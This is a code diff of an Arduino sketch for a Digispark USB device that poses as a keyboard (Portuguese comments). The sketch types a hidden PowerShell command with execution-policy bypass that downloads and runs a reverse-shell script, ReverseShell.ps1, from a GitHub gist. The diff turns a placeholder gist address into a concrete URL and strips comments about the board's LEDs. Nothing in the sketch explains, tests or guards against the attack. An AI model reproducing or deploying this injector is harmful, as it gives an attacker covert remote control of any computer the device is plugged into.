@@ -1,7 +1,7 @@
 #include "DigiKeyboardPtBr.h"
 void setup() {
-  pinMode(0,OUTPUT); //LED on model B
-  pinMode(1,OUTPUT); //LED on model A    
+  pinMode(0,OUTPUT); 
+  pinMode(1,OUTPUT);     
 }
 
 void loop() {  
@@ -13,7 +13,7 @@ void loop() {
   DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
   DigiKeyboardPtBr.delay(5000); 
   // Executando o script publicado no gist
-  DigiKeyboardPtBr.print(F("powershell -W hidden -noni -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/SEU_USUARIO/ReverseShell.ps1');\""));
+  DigiKeyboardPtBr.print(F("powershell -W hidden -noni -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/brunomlima/ae0b7c7a898cfd8628d79c080dda32ba/raw/133edad599864a188858e5ccbf2c644195f0b894/ReverseShell.ps1');\""));
   DigiKeyboardPtBr.delay(500);
   DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);  
   pisca_led(1000); 
@@ -22,11 +22,11 @@ void loop() {
 
 void pisca_led(int velocidade){  
   for (int inicio =1; inicio <= 10; inicio ++) {
-    digitalWrite(0, HIGH); // LED on <--> Action start
-    digitalWrite(1, HIGH); // LED on <--> Action start
+    digitalWrite(0, HIGH); 
+    digitalWrite(1, HIGH); 
     DigiKeyboardPtBr.delay(velocidade);  
-    digitalWrite(0, LOW); // LED off <--> Action end
-    digitalWrite(1, LOW); // LED off <--> Action end
+    digitalWrite(0, LOW); 
+    digitalWrite(1, LOW); 
     DigiKeyboardPtBr.delay(velocidade);  
   } 
 }
